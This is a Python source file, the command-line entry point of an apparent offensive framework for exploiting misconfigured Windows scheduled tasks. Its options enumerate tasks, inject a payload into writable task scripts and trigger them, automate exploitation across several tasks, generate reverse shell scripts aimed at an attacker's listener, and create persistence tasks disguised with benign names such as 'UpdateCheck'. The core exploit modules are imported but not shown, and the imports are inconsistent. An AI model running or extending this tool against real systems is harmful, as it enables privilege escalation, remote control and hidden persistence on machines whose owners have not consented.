"""
Scheduled Task Exploitation Framework - Main CLI Entry Point

A modular framework for enumerating and exploiting Windows scheduled task
misconfigurations for privilege escalation.

Usage:
    python task_exploit.py --enumerate              # Enumerate all tasks
    python task_exploit.py --analyze                # Analyze for vulnerabilities
    python task_exploit.py --exploit --task NAME --script PATH --payload PAYLOAD
    python task_exploit.py --auto --payload PAYLOAD # Fully automated
"""

import argparse
import sys
import os
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent))

from .core.enumerator import TaskEnumerator
from core.analyzer import TaskAnalyzer
from exploits.script_injector import ScriptInjector
from exploits.task_exploiter import TaskExploiter
from .utils.helpers import print_banner, print_status, check_windows, check_admin
from utils.reporter import ReportGenerator


def main():
    parser = argparse.ArgumentParser(
        description="Scheduled Task Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Enumerate all scheduled tasks:
    python task_exploit.py --enumerate

  Analyze tasks for vulnerabilities:
    python task_exploit.py --analyze

  Exploit a specific task:
    python task_exploit.py --exploit --task "BackupTask" --script "C:\\Scripts\\backup.bat" --payload payload.exe

  Automated exploitation:
    python task_exploit.py --auto --payload payload.exe

  Generate reverse shell script:
    python task_exploit.py --generate-revshell --lhost 192.168.1.100 --lport 4444

  Create persistence task:
    python task_exploit.py --persist --task-name "UpdateCheck" --payload payload.exe
        """
    )

    # Main operation modes
    mode_group = parser.add_argument_group('Operation Modes')
    mode_group.add_argument('--enumerate', '-e', action='store_true',
                            help='Enumerate all scheduled tasks')
    mode_group.add_argument('--analyze', '-a', action='store_true',
                            help='Analyze tasks for exploitation opportunities')
    mode_group.add_argument('--exploit', action='store_true',
                            help='Exploit a specific scheduled task')
    mode_group.add_argument('--auto', action='store_true',
                            help='Automated enumeration and exploitation')

    # Exploitation options
    exploit_group = parser.add_argument_group('Exploitation Options')
    exploit_group.add_argument('--task', '-t', type=str,
                               help='Task name to exploit')
    exploit_group.add_argument('--script', '-s', type=str,
                               help='Script path to modify')
    exploit_group.add_argument('--payload', '-p', type=str,
                               help='Payload executable path')
    exploit_group.add_argument('--no-restore', action='store_true',
                               help='Do not restore original script after exploitation')
    exploit_group.add_argument('--no-trigger', action='store_true',
                               help='Do not attempt to trigger task manually')
    exploit_group.add_argument('--max-exploits', type=int, default=5,
                               help='Maximum tasks to exploit in auto mode')

    # Script generation
    gen_group = parser.add_argument_group('Script Generation')
    gen_group.add_argument('--generate-revshell', action='store_true',
                           help='Generate a reverse shell script')
    gen_group.add_argument('--generate-script', type=str,
                           choices=['bat', 'ps1', 'vbs'],
                           help='Generate a malicious script')
    gen_group.add_argument('--lhost', type=str,
                           help='LHOST for reverse shell')
    gen_group.add_argument('--lport', type=int, default=4444,
                           help='LPORT for reverse shell')

    # Persistence
    persist_group = parser.add_argument_group('Persistence')
    persist_group.add_argument('--persist', action='store_true',
                               help='Create a persistence scheduled task')
    persist_group.add_argument('--task-name', type=str,
                               help='Name for persistence task')
    persist_group.add_argument('--schedule', type=str, default='DAILY',
                               choices=['DAILY', 'WEEKLY', 'ONLOGON', 'ONIDLE'],
                               help='Schedule type for persistence')
    persist_group.add_argument('--start-time', type=str, default='09:00',
                               help='Start time for scheduled tasks')
    persist_group.add_argument('--delete-task', type=str,
                               help='Delete a scheduled task (cleanup)')

    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('--output-dir', '-o', type=str, default='task_exploits',
                              help='Output directory for reports and backups')
    output_group.add_argument('--report', type=str,
                              help='Generate report to specified file')
    output_group.add_argument('--report-format', type=str,
                              choices=['json', 'txt', 'both'], default='json',
                              help='Report format')

    # General options
    general_group = parser.add_argument_group('General Options')
    general_group.add_argument('--verbose', '-v', action='store_true',
                               help='Enable verbose output')
    general_group.add_argument('--quiet', '-q', action='store_true',
                               help='Suppress banner output')

    args = parser.parse_args()

    # Check if on Windows
    if not check_windows():
        print("[-] This tool only works on Windows systems")
        sys.exit(1)

    # Show banner unless quiet
    if not args.quiet:
        print_banner()
        print_status()

        if not check_admin():
            print("\n[!] Warning: Not running as administrator")
            print("[!] Some enumeration features may not work correctly")

    # Handle enumerate mode
    if args.enumerate:
        enumerator = TaskEnumerator(args.output_dir, args.verbose)
        tasks = enumerator.enumerate_all_tasks()

        print(f"\n[+] Found {len(tasks)} scheduled tasks")

        privileged = enumerator.get_privileged_tasks()
        print(f"[+] {len(privileged)} tasks run as privileged users")

        if args.report:
            enumerator.export_tasks(args.report)

    # Handle analyze mode
    elif args.analyze:
        analyzer = TaskAnalyzer(args.output_dir, args.verbose)
        opportunities = analyzer.analyze_all_tasks()
        analyzer.display_findings()

        if args.report:
            if args.report_format in ['json', 'both']:
                analyzer.export_analysis(args.report + '.json')
            if args.report_format in ['txt', 'both']:
                reporter = ReportGenerator(args.output_dir)
                reporter.generate_text_report(analyzer.get_all_findings(), args.report + '.txt')

    # Handle exploit mode
    elif args.exploit:
        if not args.task or not args.script or not args.payload:
            print("[-] --exploit requires --task, --script, and --payload")
            sys.exit(1)

        exploiter = TaskExploiter(args.output_dir, args.verbose)

        success = exploiter.exploit_writable_script(
            task_name=args.task,
            script_path=args.script,
            payload_path=args.payload,
            auto_restore=not args.no_restore,
            trigger=not args.no_trigger
        )

        if success:
            print("\n[+] Exploitation completed!")
        else:
            print("\n[-] Exploitation failed")
            sys.exit(1)

    # Handle auto mode
    elif args.auto:
        if not args.payload:
            print("[-] --auto requires --payload")
            sys.exit(1)

        exploiter = TaskExploiter(args.output_dir, args.verbose)

        count = exploiter.auto_exploit(
            payload_path=args.payload,
            max_exploits=args.max_exploits,
            auto_restore=not args.no_restore
        )

        if count > 0:
            print(f"\n[+] Successfully exploited {count} tasks!")
        else:
            print("\n[-] No tasks successfully exploited")
            sys.exit(1)

    # Handle reverse shell generation
    elif args.generate_revshell:
        if not args.lhost:
            print("[-] --generate-revshell requires --lhost")
            sys.exit(1)

        injector = ScriptInjector(args.output_dir, args.verbose)

        # Generate both .bat and .ps1 versions
        bat_path = injector.generate_reverse_shell_script('.bat', args.lhost, args.lport)
        ps1_path = injector.generate_reverse_shell_script('.ps1', args.lhost, args.lport)

        if bat_path and ps1_path:
            print(f"\n[+] Reverse shell scripts generated!")
            print(f"    Batch: {bat_path}")
            print(f"    PowerShell: {ps1_path}")

    # Handle script generation
    elif args.generate_script:
        if not args.payload:
            print("[-] --generate-script requires --payload")
            sys.exit(1)

        injector = ScriptInjector(args.output_dir, args.verbose)
        path = injector.create_standalone_script(f'.{args.generate_script}', args.payload)

        if path:
            print(f"\n[+] Script generated: {path}")

    # Handle persistence creation
    elif args.persist:
        if not args.task_name or not args.payload:
            print("[-] --persist requires --task-name and --payload")
            sys.exit(1)

        exploiter = TaskExploiter(args.output_dir, args.verbose)

        success = exploiter.create_persistence(
            task_name=args.task_name,
            payload_path=args.payload,
            schedule=args.schedule,
            start_time=args.start_time
        )

        if success:
            print(f"\n[+] Persistence task created: {args.task_name}")
        else:
            print("\n[-] Failed to create persistence")
            sys.exit(1)

    # Handle task deletion
    elif args.delete_task:
        exploiter = TaskExploiter(args.output_dir, args.verbose)

        success = exploiter.delete_task(args.delete_task)

        if success:
            print(f"\n[+] Task deleted: {args.delete_task}")
        else:
            print("\n[-] Failed to delete task")
            sys.exit(1)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()